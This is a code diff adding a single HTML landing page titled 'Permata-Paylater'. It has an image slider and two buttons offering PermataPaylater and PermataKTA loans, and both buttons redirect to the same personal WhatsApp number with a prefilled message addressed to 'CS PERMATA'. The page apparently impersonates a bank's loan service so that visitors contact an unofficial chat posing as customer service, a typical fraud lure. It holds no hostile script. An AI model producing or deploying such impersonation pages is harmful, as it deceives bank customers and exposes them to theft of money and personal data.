@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="">
+	<meta name="keywords" content="">
+    <meta name="robots" content="index, follow">
+    <meta name="theme-color" content="#006a4e">
+    <meta property="og:image" content="https://blogger.googleusercontent.com/img/a/AVvXsEiV_s3-qoWveV7Rhn702MXnv8Of5EHzVrIqqfs8IceDF_LJcaOaNYz-OWD8rJmaofkqxuyR_ua_5wq2m75e8XMNdbCFEzVggqVqUOFVcRGfrxobb6Fdgh-OGz43L3GlnhaXCazg2yAKMNlHOJyk7Ien7xan4fJvPLCp57LEGVeuzFnMdbPemwUDgFNuTEw">
+    <link rel="shortcut icon" href="//d2uolguxr56s4e.cloudfront.net/img/shared/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta name="author" content="">
+    <meta property="og:title" content="">
+    <meta property="og:description" content="">
+    <meta property="og:image" content="">
+    <title>Permata-Paylater</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+        .container {
+            width: 100%;
+            height: 100%;
+            position: relative;
+        }
+        .slider-container {
+            position: relative;
+            overflow: hidden;
+            border-radius: 20px;
+            z-index: 1;
+            width: 100%;
+            margin: 0 auto;
+            
+        }
+        .slider {
+            display: flex;
+            width: 100%;
+            transition: transform 0.5s ease-in-out;
+        }
+        .slide {
+            width: 100%;
+            flex-shrink: 0;
+        }
+        .slide img {
+            width: 100%;
+            height: auto;
+          
+        }
+        .photo-background {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://blogger.googleusercontent.com/img/a/AVvXsEhnxF4Jaez4Gx9hJYZV4ce9sgCZ5WJNiCzqB2rP2ofSqcZqJdSSdlY2N_JBDjFFkvEBTh0kQttjGiCGIwwC4m00yyh8vXrwJtTcVHUjJuYU7j3neNdpCu1yvyYshToY7lO4Z5jt0NSqySmZC41CKZsyfwJFizIARaFb85vYUUzBx1_Rv_U1_83wXrfHxho') center center no-repeat;
+            background-size: cover;
+            z-index: -1;
+        }
+        .form-container {
+            background: rgba(255, 255, 255, 0.8);
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 290px;
+            text-align: center;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .form-container button {
+            margin: 10px;
+            padding: 25px 50px;
+            background-color: #006a4e;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 110%;
+            font-weight: bold;
+        }
+        .form-container button:hover {
+            background-color: #006a4e;
+        }
+        .loading {
+            display: none;
+            margin-top: 10px;
+        }
+        .nav-button {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            background-color: rgba(0, 0, 0, 0.5);
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            cursor: pointer;
+            z-index: 2;
+        }
+        .prev {
+            left: 10px;
+        }
+        .next {
+            right: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="slider-container">
+            <button class="nav-button prev" onclick="moveSlide(-1)">&#10094;</button>
+            <div class="slider">
+                <div class="slide">
+                    <img src="https://blogger.googleusercontent.com/img/a/AVvXsEgkEE1WpGZ4uzdqC_ywH90LbzqEQNi4SXL1wZ6XyYXfeX9vcDKWDGZ3DyuV4bF-CMjqp8rK-X-wqf2Ns4Z0sz9o4qN_fijYyvSrTJxsZXEDKyhGsudttzaBmfV3pXujl963rsj4QE2UF68il6ncpHe8Vs2B8gMAcp7H71weFhaZzMHFAxmrhqM7iDixJYw" alt="Slide 1">
+                </div>
+                <div class="slide">
+                    <img src="https://blogger.googleusercontent.com/img/a/AVvXsEhvgrG8VhHaMRcmcBCHZuEWFadagZVFNrp6YinKc5Rz-kXXo1DewuR_ZuLWdaeVoak3mnjiPO2NsCgcpV4WQe5x792e8Y1Box5ilQWp3Pa_lU7PfmKx4Prg60IIUwILYhe98wUvgi1F_MFouSFR8itodZcGOI8eiDWHUMu6zUxuhGLP_1NMbOgMHZrZEfo" alt="Slide 2">
+                </div>
+                <div class="slide">
+                    <img src="https://blogger.googleusercontent.com/img/a/AVvXsEgQlIJ2HQpPKBOP8RSv4PrFXKPlpIynGg_-zJOyyEjGuVT7nLK9S9GuK2OaNsQVBxF1MS_2KQCvP3Na1lopKDTlvEKw2waXOz0xG5GZPQ09QkAQvlPq7g--s4Jw8HZNdm-vac2UXsmSjh-2NyCxjeqkdueu9tm3IDSTEs6GQcU4KTuVhqU0yEvItiH-088" alt="Slide 3">
+                </div>
+                <div class="slide">
+                    <img src="https://blogger.googleusercontent.com/img/a/AVvXsEijxG6NPJDc9-9wjO67JtEOWTtUW90Sw2vOjBwCtEcFYt2ltATC8_Q6JhA3C1XkgOojtY8NweaVaeweSIzcS0HYX6U5eiGJ9S-bw4xL8V5SeJatZwTc8aGN9YjYnoEovpLOG2y6LbCuWF8fAl5KufYGhyPph9t4I7AloMtOivVA1lytPTo-Jhwejp0P1Bg" alt="Slide 4">
+                </div>
+                <div class="slide">
+                    <img src="https://blogger.googleusercontent.com/img/a/AVvXsEi3xanNhao6e3iBY8rZCzh20kp4C0k12XagA68FqBWsbFPrkXfSTSr0-jk8esvJNoM055BB6SaeGaL4pcPRmm3c0eU2t1RjtuzpPt4UsfWzTXe4fi26H4Ypef7kdHYfkIPzq9MBZrunFpYU6C7IYGWn8AeSr89rxOcdK-cTtrAvVKpZbnDtlwTVAV4WM8Y" alt="Slide 5">
+                </div>
+                <div class="slide">
+                    <img src="https://blogger.googleusercontent.com/img/a/AVvXsEg6QZyLDdZ1QxDuRYsZ6ABcFHI2x5_LbPauLCRCVzt4VrSFFE9Gd0p9U9gmeTpnxvTwX8QHLrgj2IJuKdqHNEnyJ5obl12e3CivwF40ttpM1JpVyFId26IiVo3TNpz__dmCOO51ZEjsfF5RAHJMCNBOFhjp-Ix-v9WtWfhxMMifuPVsy6XpmjndYtiuThI" alt="Slide 6">
+                </div>
+            </div>
+            <button class="nav-button next" onclick="moveSlide(1)">&#10095;</button>
+        </div>
+        <div class="photo-background"></div>
+        <div class="form-container">
+            <button id="support-button">Ajukan PermataPaylater</button>
+            <button id="block-button">Ajukan PermataKTA</button>
+            <img src="loading.gif" class="loading" id="loading" alt="Loading...">
+        </div>
+    </div>
+
+    <script>
+        let slideIndex = 0;
+
+        function showSlides() {
+            const slides = document.querySelector('.slider');
+            const totalSlides = document.querySelectorAll('.slide').length;
+
+            if (slideIndex >= totalSlides) {
+                slideIndex = 0;
+            } else if (slideIndex < 0) {
+                slideIndex = totalSlides - 1;
+            }
+
+            slides.style.transform = `translateX(-${slideIndex * 100}%)`;
+        }
+
+        function moveSlide(step) {
+            slideIndex += step;
+            showSlides();
+        }
+
+        // Optional: Automatically change slides every 3 seconds
+        setInterval(() => moveSlide(1), 3000);
+
+        document.getElementById('support-button').addEventListener('click', function() {
+            window.location.href = 'https://wa.me/62817811564?text=Hallo%20Bantuan%20Cs%20PERMATA';
+        });
+
+        document.getElementById('block-button').addEventListener('click', function() {
+            window.location.href = 'https://wa.me/62817811564?text=Hallo%20Bantuan%20Cs%20PERMATA';
+        });
+    </script>
+</body>
+</html>
